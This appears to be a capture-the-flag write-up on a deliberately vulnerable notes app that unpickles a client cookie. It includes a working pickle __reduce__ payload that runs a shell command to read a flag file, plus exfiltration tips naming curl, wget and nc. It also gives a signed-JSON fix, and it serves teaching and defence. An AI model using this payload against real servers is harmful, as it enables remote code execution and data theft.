# Notely — Insecure Deserialization (pickle → RCE)

| | |
|---|---|
| **Vulnerability** | Insecure deserialization of untrusted input (Python `pickle`) |
| **Impact** | Remote code execution |
| **Difficulty** | ★★★★ |
| **Approach** | Black-box |

## The application

Notely is a small notes app with no login. It "remembers" each visitor's preferences — display
name, theme, density — so the experience feels personal across visits. It does that by storing the
preferences in a cookie (`np_session`) and restoring them on every request.

Run it:
```bash
docker compose up -d        # http://localhost:9006
```

## Discovery

The convenience feature is the attack surface. Decoding the `np_session` cookie from base64 gives:

```
gASVPAAAAAAAAAB9lCiMBXRoZW1l...
→ \x80\x04\x95 ... }(... theme ... light ... display_name ... Guest ...
```

The leading bytes `\x80\x04\x95` are the **pickle protocol-4 magic number**. That one signature is
the whole finding: the server is deserializing a value the client fully controls.

```python
# restored on every request via @app.before_request
def load_prefs():
    raw = request.cookies.get("np_session")
    if not raw:
        return DEFAULT_PREFS
    return pickle.loads(base64.b64decode(raw))   # untrusted bytes -> code execution
```

`pickle.loads()` does not merely parse data — it can reconstruct arbitrary objects and **invoke
callables while unpickling**. Whoever controls the cookie controls what Python executes. Because the
restore runs in `before_request`, the sink fires on *every* page, not only on `/settings`.

## Exploitation

Pickle calls whatever an object's `__reduce__` returns. To get the flag back without any network
tooling, I return a function that produces **output**, so the deserialized object *becomes* the
command result — which the app then prints in its greeting:

```python
import pickle, base64, subprocess

class RCE:
    def __reduce__(self):
        return (subprocess.check_output, (["cat", "/flag.txt"],))

print(base64.b64encode(pickle.dumps(RCE())).decode())
```

Set the output as the `np_session` cookie, request any page, and read the greeting:

```
Welcome back, b'FLAG{p1ckl3_r3duc3_rc3_untrust3d_d3s3r14l1z4t10n}\n' 👋
```

> **Operator note:** this container is a slim image with **no `curl`, `wget`, or `nc`** — only
> `python3`. An out-of-band exfil using `curl` fails silently. Two habits avoid the dead end:
> enumerate the target's installed tools before committing to a channel, and confirm execution with a
> `time.sleep(10)` oracle first (a hung response proves code runs, independent of any channel).

## Root-cause fix

Filtering the cookie or validating the object *after* loading is too late — pickle runs code *during*
the load. The root cause is pickle on untrusted bytes, so the fix removes it:

```python
from itsdangerous import URLSafeSerializer

serializer = URLSafeSerializer(app.secret_key, salt="notely-prefs")

def encode_prefs(prefs: dict) -> str:
    return serializer.dumps(prefs)             # JSON + HMAC signature

def load_prefs():
    raw = request.cookies.get("np_session")
    if not raw:
        return DEFAULT_PREFS
    try:
        data = serializer.loads(raw)           # JSON only (no code), signature verified
        return data if isinstance(data, dict) else DEFAULT_PREFS
    except Exception:
        return DEFAULT_PREFS                   # bad signature / malformed -> defaults
```

This closes the class two ways at once:

- the payload is parsed as **plain JSON** — data, never code, so there is nothing to execute;
- the cookie is **cryptographically signed**, so a tampered `np_session` raises `BadSignature` and
  falls back to defaults.

Verified: the original `__reduce__` payload now returns `Welcome back, Guest` (no flag), while
legitimate preferences still round-trip. (The secret should be a random, environment-supplied value
in production, not hard-coded.)

## Key lesson

Any serialized blob the client can touch — a cookie, a hidden field, a cache entry — is untrusted
input. Never `pickle.loads()` (or `yaml.load`, or native deserialize) on it. Persist small client
state as **signed JSON of a fixed shape**, not a serialized object. The unifying rule across this and
SQLi, SSTI and command injection: **keep untrusted input as data, never let it become code.**
